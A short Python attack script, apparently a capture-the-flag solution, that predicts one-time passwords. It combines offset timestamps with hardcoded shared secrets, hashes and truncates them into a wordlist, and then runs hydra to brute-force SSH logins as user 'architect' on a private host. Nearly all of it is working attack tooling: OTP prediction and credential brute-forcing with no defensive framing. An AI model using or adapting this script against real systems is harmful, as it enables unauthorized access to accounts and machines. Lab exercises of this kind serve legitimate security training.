import itertools
from datetime import datetime, timedelta
from hashlib import sha256
import os

os.system('python3 ntp_syncer.py')

#shared secret
shared = [128939448577488,592988748673453,792513759492579]

def multiply(countryA, countryB, countryC , sharedSecret):
    multipliedTimes = countryA*countryB*countryC
    #Xor multipliedTimes with Shared secret
    unhashedOTP = multipliedTimes^sharedSecret
    #Hash the OTP
    hashedOTP = (sha256(repr(unhashedOTP).encode('utf-8')).hexdigest())
    #truncate hashed OTP (shorten)
    finalOTP = hashedOTP[22:44]
     
    #write all OTP possibilities to a new file (create wordlist of OTPs)
    f = open("wordlist.txt", "a")
    f.write(finalOTP+'\n')
    f.close()
   
#time sources
now = datetime.now()

Ukraine = datetime.now() + timedelta(hours=4, minutes=43)
UkraineCurrentTime = int(Ukraine.strftime("%d%H%M"))

Germany = datetime.now() + timedelta(hours=13, minutes=55)
GermanyCurrentTime = int(Germany.strftime("%d%H%M"))

England = datetime.now() + timedelta(hours=9, minutes=19)
EnglandCurrentTime = int(England.strftime("%d%H%M"))

Denmark = datetime.now() + timedelta(hours=-5, minutes=18)
DenmarkCurrentTime = int(Denmark.strftime("%d%H%M"))

Nigeria = datetime.now() + timedelta(hours=1, minutes=6)
NigeriaCurrentTime = int(Nigeria.strftime("%d%H%M"))

allTimeSources = [UkraineCurrentTime,GermanyCurrentTime,EnglandCurrentTime,DenmarkCurrentTime,NigeriaCurrentTime] 

# make a list, generate all permutation of a set of 3
for permutations in list(itertools.permutations(allTimeSources, 3)):
    #assign each index to variable name
    countryA = permutations[0]
    countryB = permutations[1]
    countryC = permutations[2]
    for sharedSecret in shared:
        multiply(countryA, countryB, countryC, sharedSecret)

os.system("cat wordlist.txt | sort | uniq  > wd.txt")
os.system("wc wd.txt")
os.system("hydra -l architect -P ./wd.txt -t 40 -V ssh://10.10.1.10 -I | grep 'password:'" )